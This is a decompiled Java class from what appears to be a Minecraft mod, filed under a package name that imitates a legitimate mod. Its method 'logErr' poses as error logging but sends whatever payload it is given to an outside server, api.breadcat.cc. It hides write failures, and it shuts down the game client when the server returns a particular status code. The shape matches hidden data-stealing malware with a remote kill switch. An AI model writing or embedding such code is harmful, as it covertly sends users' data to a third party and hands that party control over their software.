/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.minecraft.client.Minecraft
 */
package codes.biscuit.handler;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import net.minecraft.client.Minecraft;

public class errors {
    public static void logErr(String payload) throws MalformedURLException, IOException {
        HttpURLConnection con = (HttpURLConnection)new URL("http://api.breadcat.cc:80").openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("Content-Type", "text/plain");
        con.setRequestProperty("User-Agent", "SmolPeePeeEnergy");
        con.setRequestProperty("Cookie", "BreadOS/69.420");
        con.setDoOutput(true);
        try (OutputStream bs = con.getOutputStream();){
            bs.write(payload.getBytes(StandardCharsets.UTF_8));
        }
        catch (IOException ignored) {
            // empty catch block
        }
        if (con.getResponseCode() == 418) {
            Minecraft.func_71410_x().func_71405_e();
        }
        con.getResponseCode();
    }
}

